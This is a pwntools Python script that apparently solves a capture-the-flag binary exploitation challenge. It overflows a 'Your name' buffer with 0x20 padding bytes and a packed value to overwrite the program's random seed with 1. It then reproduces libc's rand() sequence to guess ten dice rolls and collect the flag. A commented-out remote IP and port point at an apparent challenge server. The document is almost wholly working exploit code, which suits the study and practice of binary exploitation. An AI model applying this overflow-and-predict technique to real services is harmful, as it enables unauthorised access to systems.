#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys
from pwn import *
from ctypes import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

target=['./b59204f56a0545e8a22f8518e749f19f']
use_gdb = False

#def exp(ip = None, port = None, use_gdb = False):
def exp(ip = None, port = None):
    global use_gdb
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
    else:
        p=process(target)
    if use_gdb:
        gdb.attach(p)
        pause()

    libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    libc.srand(1)

    p.sendafter(b"Your name:", b'a'*0x20 + p64(1) + b'\n')
    for i in range(10):
        p.sendafter(b"number:", str(libc.rand() % 6 + 1)+'\n')

    p.recvuntil(b"Here is your flag!")
    flag = p.recv()
    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    #remote_str = '220.249.52.133:59940'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)
